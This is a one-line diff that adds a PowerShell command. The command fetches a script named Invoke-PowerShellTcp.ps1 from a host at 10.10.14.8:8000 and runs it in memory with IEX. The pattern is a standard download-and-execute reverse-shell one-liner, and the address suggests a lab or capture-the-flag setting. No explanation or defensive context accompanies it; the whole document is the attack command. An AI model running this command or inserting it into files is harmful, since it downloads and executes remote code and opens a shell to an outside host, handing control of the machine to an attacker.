@@ -1,0 +1,1 @@
+powershell.exe “IEX(New-Object Net.WebClient).downloadString(‘http://10.10.14.8:8000/Invoke-PowerShellTcp.ps1')"
